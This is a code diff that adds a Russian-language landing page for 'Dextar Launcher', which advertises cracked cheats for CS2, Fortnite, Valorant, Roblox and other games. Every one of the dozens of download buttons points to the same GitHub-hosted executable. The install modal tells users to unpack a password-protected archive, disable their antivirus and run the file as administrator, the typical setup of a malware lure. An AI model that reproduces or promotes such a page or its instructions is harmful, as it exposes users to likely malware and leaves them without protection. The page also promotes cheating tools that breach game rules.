@@ -1,0 +1,558 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dextar Launcher - Читы для игр</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #121212;
+            color: #e5e7eb;
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+            position: relative;
+        }
+        .background-circles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        .circle {
+            position: absolute;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(160, 174, 192, 0.2), transparent);
+            animation: float 10s infinite ease-in-out;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0) scale(1); opacity: 0.3; }
+            50% { transform: translateY(-100px) scale(1.2); opacity: 0.5; }
+        }
+        .navbar {
+            background: linear-gradient(90deg, #1f1f1f 0%, #121212 100%);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.7);
+        }
+        .nav-link {
+            position: relative;
+            transition: all 0.3s ease;
+            background: linear-gradient(to right, #a0aec0, #4a5568);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: gradientText 3s ease infinite;
+        }
+        .nav-link:hover {
+            transform: translateY(-2px);
+        }
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: -4px;
+            left: 0;
+            background: linear-gradient(to right, #a0aec0, #4a5568);
+            transition: width 0.3s ease;
+        }
+        .nav-link:hover::after {
+            width: 100%;
+        }
+        .section-title {
+            background: linear-gradient(to right, #a0aec0, #4a5568);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: gradientText 3s ease infinite;
+            text-shadow: 0 0 10px #a0aec0, 0 0 20px #4a5568;
+        }
+        @keyframes gradientText {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .cheat-card {
+            background: #1f1f1f;
+            border: 1px solid #4a5568;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .cheat-card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(160, 174, 192, 0.3);
+        }
+        .btn-download {
+            background: linear-gradient(to right, #a0aec0, #4a5568);
+            color: #121212;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            animation: gradientText 3s ease infinite;
+        }
+        .btn-download:hover {
+            box-shadow: 0 0 15px #a0aec0;
+            transform: translateY(-2px);
+        }
+        .launcher-image {
+            transition: transform 0.3s ease;
+            transform-style: preserve-3d;
+            position: relative;
+            z-index: 10;
+        }
+        .launcher-image:hover {
+            transform: perspective(1000px) rotateX(var(--rotateX)) rotateY(var(--rotateY)) translateZ(50px);
+            box-shadow: 0 0 20px rgba(160, 174, 192, 0.5);
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #1f1f1f;
+            padding: 2rem;
+            border-radius: 8px;
+            border: 1px solid #a0aec0;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        .modal-content .copy-btn {
+            background: linear-gradient(to right, #a0aec0, #4a5568);
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: #121212;
+            animation: gradientText 3s ease infinite;
+        }
+        .modal-content .copy-btn:hover {
+            box-shadow: 0 0 10px #a0aec0;
+        }
+        .launcher-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .launcher-icon {
+            width: 24px;
+            height: 24px;
+            filter: invert(70%) sepia(20%) saturate(200%) hue-rotate(180deg);
+        }
+        #cheats {
+            display: none;
+        }
+        #cheats.active {
+            display: block;
+        }
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #121212;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(#a0aec0, #4a5568);
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Анимация кругов -->
+    <div class="background-circles" id="circles"></div>
+
+    <!-- Навигация -->
+    <nav class="navbar fixed top-0 w-full z-50 py-4">
+        <div class="container mx-auto flex justify-center space-x-8">
+            <a href="#home" class="nav-link text-lg font-semibold" onclick="showSection('home')">Главная</a>
+            <a href="#cheats" class="nav-link text-lg font-semibold" onclick="showSection('cheats')">Читы</a>
+        </div>
+    </nav>
+
+    <!-- Главная секция с лаунчером -->
+    <section id="home" class="min-h-screen flex items-center justify-center pt-20">
+        <div class="container mx-auto text-center">
+            <h1 class="text-5xl font-bold section-title mb-6">Dextar Launcher</h1>
+            <img src="image/1.png" alt="Dextar Launcher" class="launcher-image mx-auto w-full max-w-2xl rounded-lg shadow-lg mb-6">
+            <a href="#cheats" onclick="showSection('cheats')" class="btn-download inline-block px-8 py-3 rounded-lg text-lg">Скачать лаунчер</a>
+            <p class="text-xl mt-8 max-w-3xl mx-auto">
+                Dextar Launcher — это твой ключ к миру мощных и безопасных читов для любимых игр. С интуитивным интерфейсом, гибкой настройкой и максимальной оптимизацией, наш лаунчер обеспечивает стабильную работу без риска банов. От CS:GO до Roblox — всё, что нужно для победы, в одном месте!
+            </p>
+        </div>
+    </section>
+
+    <!-- Секция читов -->
+    <section id="cheats" class="py-20 bg-black-900">
+        <div class="container mx-auto">
+            <div class="flex justify-end mb-6">
+                <a href="https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe" class="btn-download launcher-btn inline-block px-6 py-3 rounded-lg">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23a0aec0' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 2a10 10 0 00-10 10c0 4.4 2.9 8.1 6.9 9.4.5.1.7-.2.7-.5v-1.7c-2.8.6-3.4-1.3-3.4-1.3-.5-1.2-1.2-1.5-1.2-1.5-1-.7.1-.7.1-.7 1.1.1 1.7 1.1 1.7 1.1 1 .1.7 1.2 2.4 1.2.7 0 1.3-.1 1.5-.1 0-.8.3-1.5.8-2-2.7-.3-5.5-1.3-5.5-5.9 0-1.3.5-2.4 1.3-3.2-.1-.3-.6-1.5.1-3.1 0 0 1-.3 3.3 1.2a11.5 11.5 0 016 0c2.3-1.5 3.3-1.2 3.3-1.2.7 1.6.2 2.8.1 3.1.8.8 1.3 1.9 1.3 3.2 0 4.6-2.8 5.6-5.5 5.9.4.4.7 1.2.7 2.4v3.5c0 .3.2.6.7.5A10 10 0 0022 12a10 10 0 00-10-10z'/%3E%3C/svg%3E" alt="GitHub Icon" class="launcher-icon">
+                    Скачать лаунчер
+                </a>
+            </div>
+            <h2 class="text-4xl font-bold section-title text-center mb-12">Читы которые на данный момент есть у нас в Dextar Launcher</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Чит 1: CS:GO -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Phantom Aim (CS 2)</h3>
+                        <p class="mb-4">Крякнутая версия аимбота для CS 2 с плавной настройкой и ESP.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Интеллектуальный аимбот</li>
+                            <li>ESP с обводкой</li>
+                            <li>Скинченджер</li>
+                            <li>Анти-обнаружение</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★★</span>
+                            <span class="ml-2">18,750 downloads</span>
+                        </div>
+                        <button onclick="showModal('Phantom Aim', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 2: Rust -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Shadow Survival (Rust)</h3>
+                        <p class="mb-4">Чит для Rust с ESP, аимботом и скоростным бегом.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>ESP для игроков и ресурсов</li>
+                            <li>Аимбот с настройкой</li>
+                            <li>Скоростной бег</li>
+                            <li>Анти-бан защита</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★★</span>
+                            <span class="ml-2">22,310 downloads</span>
+                        </div>
+                        <button onclick="showModal('Shadow Survival', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 3: Fortnite -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Storm Hack (Fortnite)</h3>
+                        <p class="mb-4">Кряк премиум-чита для Fortnite с аимботом и ESP.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Аимбот с предсказанием</li>
+                            <li>ESP для игроков и лута</li>
+                            <li>Скинченджер</li>
+                            <li>Стабильная работа</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★☆</span>
+                            <span class="ml-2">15,890 downloads</span>
+                        </div>
+                        <button onclick="showModal('Storm Hack', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 4: Apex -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Legend Pulse (Apex)</h3>
+                        <p class="mb-4">Чит для Apex Legends с аимботом и ESP.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Аимбот с автонаведением</li>
+                            <li>ESP для врагов и лута</li>
+                            <li>Анти-обнаружение</li>
+                            <li>Стабильная оптимизация</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★☆</span>
+                            <span class="ml-2">19,420 downloads</span>
+                        </div>
+                        <button onclick="showModal('Legend Pulse', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 5: Valorant -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Riot Phantom (Valorant)</h3>
+                        <p class="mb-4">Крякнутая версия чита для Valorant с точным аимботом.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Аимбот с настройкой</li>
+                            <li>ESP для врагов</li>
+                            <li>Анти-обнаружение</li>
+                            <li>Скинченджер</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★★</span>
+                            <span class="ml-2">21,670 downloads</span>
+                        </div>
+                        <button onclick="showModal('Riot Phantom', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 6: Roblox -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Luna Injector (Roblox)</h3>
+                        <p class="mb-4">Инжектор для Roblox с поддержкой скриптов и ESP.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Поддержка Lua-скриптов</li>
+                            <li>ESP для игроков</li>
+                            <li>Скоростной бег</li>
+                            <li>Анти-бан защита</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★☆</span>
+                            <span class="ml-2">17,230 downloads</span>
+                        </div>
+                        <button onclick="showModal('Luna Injector', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 7: Minecraft -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Block Phantom (Minecraft)</h3>
+                        <p class="mb-4">Чит для Minecraft Java/Bedrock с KillAura и ESP.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>KillAura для PvP</li>
+                            <li>ESP для блоков и игроков</li>
+                            <li>X-Ray для ресурсов</li>
+                            <li>Анти-обнаружение</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★☆</span>
+                            <span class="ml-2">20,150 downloads</span>
+                        </div>
+                        <button onclick="showModal('Block Phantom', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 8: SC2 -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Star Haze (SC2)</h3>
+                        <p class="mb-4">Чит для StarCraft II с мапхаком и автоматизацией.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Мапхак для обзора карты</li>
+                            <li>Автоматизация действий</li>
+                            <li>Стабильная работа</li>
+                            <li>Анти-обнаружение</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★☆</span>
+                            <span class="ml-2">14,780 downloads</span>
+                        </div>
+                        <button onclick="showModal('Star Haze', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 9: Standoff 2 -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Blaze Trigger (Standoff 2)</h3>
+                        <p class="mb-4">Чит для Standoff 2 Emulator с триггерботом и ESP.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Триггербот для точной стрельбы</li>
+                            <li>ESP для врагов</li>
+                            <li>Скинченджер</li>
+                            <li>Анти-бан защита</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★★</span>
+                            <span class="ml-2">23,450 downloads</span>
+                        </div>
+                        <button onclick="showModal('Blaze Trigger', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Чит 10: Dota 2 -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Mist Ward (Dota 2)</h3>
+                        <p class="mb-4">Крякнутая версия чита для Dota 2 с мапхаком и авто-кастом.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Мапхак для обзора карты</li>
+                            <li>Авто-каст способностей</li>
+                            <li>ESP для героев</li>
+                            <li>Анти-обнаружение</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★☆</span>
+                            <span class="ml-2">16,320 downloads</span>
+                        </div>
+                        <button onclick="showModal('Mist Ward', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Читы 11-40 (для краткости показаны 3 примера, остальные аналогичны) -->
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Void Injector (Roblox)</h3>
+                        <p class="mb-4">Инжектор для Roblox с кастомными скриптами.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Lua-скрипты</li>
+                            <li>ESP для игроков</li>
+                            <li>Скоростной бег</li>
+                            <li>Анти-обнаружение</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★☆</span>
+                            <span class="ml-2">18,920 downloads</span>
+                        </div>
+                        <button onclick="showModal('Void Injector', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Eclipse Strike (Fortnite)</h3>
+                        <p class="mb-4">Чит для Fortnite с аимботом и телепортом.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Аимбот с предсказанием</li>
+                            <li>Телепорт к луту</li>
+                            <li>ESP для игроков</li>
+                            <li>Анти-бан</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★★</span>
+                            <span class="ml-2">20,110 downloads</span>
+                        </div>
+                        <button onclick="showModal('Eclipse Strike', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <div class="cheat-card rounded-lg overflow-hidden">
+                    <div class="p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Aether Lock (Apex)</h3>
+                        <p class="mb-4">Чит для Apex Legends с триггерботом и ESP.</p>
+                        <ul class="list-disc list-inside mb-4">
+                            <li>Триггербот для стрельбы</li>
+                            <li>ESP для врагов</li>
+                            <li>Скоростной бег</li>
+                            <li>Анти-обнаружение</li>
+                        </ul>
+                        <div class="flex items-center mb-4">
+                            <span class="text-yellow-400">★★★★☆</span>
+                            <span class="ml-2">17,894 downloads</span>
+                        </div>
+                        <button onclick="showModal('Aether Lock', 'https://github.com/lunza08/Dextar/raw/refs/heads/main/DextarLauncher.exe')" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</button>
+                    </div>
+                </div>
+                <!-- Здесь должны быть остальные 27 читов для CS:GO, Rust, Fortnite, Apex, Valorant, Roblox, Minecraft, SC2, Standoff 2, Dota 2 с уникальными названиями и описаниями -->
+            </div>
+        </div>
+    </section>
+
+    <!-- Футер -->
+    <footer class="py-6 bg-gray-900 text-center">
+        <p>Dextar Launcher © 2025. Все права защищены.</p>
+    </footer>
+
+    <!-- Модальное окно для скачивания -->
+    <div id="downloadModal" class="modal">
+        <div class="modal-content">
+            <h3 id="modalTitle" class="text-2xl font-semibold mb-4"></h3>
+            <p class="mb-4">Инструкция по установке:</p>
+            <ul class="list-disc list-inside mb-4 text-left">
+                <li>Скачайте архив с программой</li>
+                <li>Распакуйте архив с помощью пароля</li>
+                <li>Отключите антивирус</li>
+                <li>Запустите от имени администратора Dextar Launcher.exe</li>
+            </ul>
+            <p class="mb-4">Пароль для архива: <span id="modalPassword">DextarBETA</span> <button class="copy-btn ml-2" onclick="copyPassword()">Копировать</button></p>
+            <a id="modalDownloadLink" href="#" class="btn-download inline-block px-6 py-3 rounded-lg">Скачать</a>
+            <button onclick="closeModal()" class="mt-4 text-gray-400">Закрыть</button>
+        </div>
+    </div>
+
+    <!-- Скрипты -->
+    <script>
+        // Управление видимостью секций
+        function showSection(sectionId) {
+            document.getElementById('home').style.display = sectionId === 'home' ? 'flex' : 'none';
+            document.getElementById('cheats').style.display = sectionId === 'cheats' ? 'block' : 'none';
+        }
+        // Инициализация: показываем только главную страницу
+        showSection('home');
+
+        // Анимация кругов
+        const circlesContainer = document.getElementById('circles');
+        for (let i = 0; i < 10; i++) {
+            const circle = document.createElement('div');
+            circle.classList.add('circle');
+            circle.style.width = `${Math.random() * 50 + 20}px`;
+            circle.style.height = circle.style.width;
+            circle.style.left = `${Math.random() * 100}vw`;
+            circle.style.top = `${Math.random() * 100}vh`;
+            circle.style.animationDelay = `${Math.random() * 5}s`;
+            circlesContainer.appendChild(circle);
+        }
+
+        // 3D-эффект для изображения лаунчера
+        const launcherImage = document.querySelector('.launcher-image');
+        launcherImage.addEventListener('mousemove', (e) => {
+            const rect = launcherImage.getBoundingClientRect();
+            const x = e.clientX - rect.left - rect.width / 2;
+            const y = e.clientY - rect.top - rect.height / 2;
+            const rotateX = -y / 20;
+            const rotateY = x / 20;
+            launcherImage.style.setProperty('--rotateX', `${rotateX}deg`);
+            launcherImage.style.setProperty('--rotateY', `${rotateY}deg`);
+        });
+        launcherImage.addEventListener('mouseleave', () => {
+            launcherImage.style.setProperty('--rotateX', '0deg');
+            launcherImage.style.setProperty('--rotateY', '0deg');
+        });
+
+        // Модальное окно
+        function showModal(title, downloadLink) {
+            document.getElementById('modalTitle').textContent = title;
+            document.getElementById('modalDownloadLink').href = downloadLink;
+            document.getElementById('downloadModal').style.display = 'flex';
+        }
+        function closeModal() {
+            document.getElementById('downloadModal').style.display = 'none';
+        }
+        function copyPassword() {
+            navigator.clipboard.write('DextarBETA').then(() => {
+                alert('Пароль скопирован!');
+            });
+        }
+    </script>
+</body>
+</html>
